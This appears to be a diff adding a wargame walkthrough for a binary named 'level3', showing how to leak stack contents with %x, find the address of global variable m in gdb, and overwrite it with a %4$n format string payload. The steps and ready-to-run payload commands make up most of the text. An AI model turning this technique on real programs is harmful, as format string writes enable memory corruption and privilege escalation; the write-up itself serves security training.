@@ -1,0 +1,55 @@
+Walkthrough: Format String Exploitation to Modify Memory (level3)
+
+Objective:
+Exploit a format string vulnerability to write a specific value into a memory location, specifically modifying the global variable `m`.
+
+---
+
+Step 1: Analyze Stack with Format String Leak
+
+Start by examining where your input lands on the stack using a format string.
+
+Command:
+    python -c 'print ("0000 " + "%x " * 10)' | ./level3
+
+This prints the contents of stack positions. By examining the output, you can determine the position of your input (e.g., "0000") on the stack.
+
+You want to find the position that corresponds to the format string `%n`, which writes the number of characters printed so far to the address pointed to on the stack.
+
+---
+
+Step 2: Get the Address of the Target Variable
+
+Use `gdb` to get the address of the global integer variable `m`:
+
+    (gdb) run
+    Starting program: /home/user/level3/level3 
+
+    [Inferior 1 (process 4310) exited normally]
+    (gdb) p &m
+    $1 = (<data variable, no debug info> *) 0x804988c
+
+This is the address where we want to write data.
+
+---
+
+Step 3: Construct the Exploit Payload
+
+We want to overwrite the value of `m` using `%n`, which writes the number of characters printed so far to a memory location.
+
+We place the address of `m` at the beginning of the input. Then we pad the output to a desired length and use `%n` to perform the write.
+
+Payload:
+    - Address of `m`: \x8c\x98\x04\x08
+    - Padding: 60 bytes of 'A' (adjust based on offset found earlier)
+    - Format specifier: %4$n (write to 4th argument on the stack, which corresponds to our injected address)
+
+Command:
+    (python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' && cat) | ./level3
+
+Here `%4$n` tells the program to write the number of characters printed so far (64 in this case) into the address given at stack position 4 — which is our `m` variable.
+
+---
+
+Result:
+If successful, the global variable `m` will be modified, and the challenge condition will be satisfied.
